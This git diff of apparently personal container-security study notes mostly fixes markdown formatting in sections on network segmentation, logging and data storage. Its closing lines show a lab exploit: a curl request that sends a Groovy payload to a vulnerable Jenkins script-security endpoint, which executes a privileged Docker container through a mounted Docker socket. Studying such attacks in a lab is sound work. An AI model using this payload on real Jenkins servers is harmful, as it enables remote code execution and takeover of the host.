@@ -79,7 +79,7 @@ Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-ima
 </details>
 
 <details>
-<summary> 6: Inadequate Network Segmentation
+<summary> 6: Inadequate Network Segmentation  </summary>
   
 - Can lead to Data exfilteration and unauthorised access.
 - Containers are their networks are not properly isolated from eachother.
@@ -87,20 +87,22 @@ Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-ima
 - Virtual networks will Isolates Network traffic, firewalls controls inbound and Outbound network traffic and security groups will limit network traffic.
 - Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
 - Use option --network option ```docker run --network=my-network -d my-image```
+
 </details>
 
 <details>
-<summary> 7: Inadequate Logging and Monitoring
+<summary> 7: Inadequate Logging and Monitoring  </summary>
   
 - Logging helps in detecting and resposding to attacks.
 - All important events in containers need to be logged.
 - Resolution: Collect logs from host system, Conatinerns and orchestration platform.
 - Best practises: Use SIEM tools to detect and respond in real-time.
 - Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
+
 </details>
 
 <details>
-<summary> 8: Insecure Data Storage in Containers 
+<summary> 8: Insecure Data Storage in Containers  </summary>
   
 - May lead to data breaches. Sensitive data maynot be properly secured.
 - Resolution: Encrypt sensitive data, use secure storage options like NAS (Network attached Storage) or SAN (Styorage area networks)
@@ -124,7 +126,7 @@ Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-ima
 - Best practise: Use a seperate container to manage docker deamon.
 
 ``` docker run -d -p 8080:8080 --rm -v /var/run/docker.scok:/var/run/docker.sock --name jenkins -t vuln-jenkins:latest ```
-
+</br>
  ![image](https://github.com/Vamckis/Container-Security/assets/71128825/03976075-072a-4902-a561-179c2d394388)
  - Creating ngnix container with --privileged option
 ``` curl -k -4 -X POST "http://localhjost:8080//descriptorByName/org.jenkins.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d 'value=class abcd{abcd(){"docker run -P --rm --privileged --name ngnix".execute()}}' ``` </br>
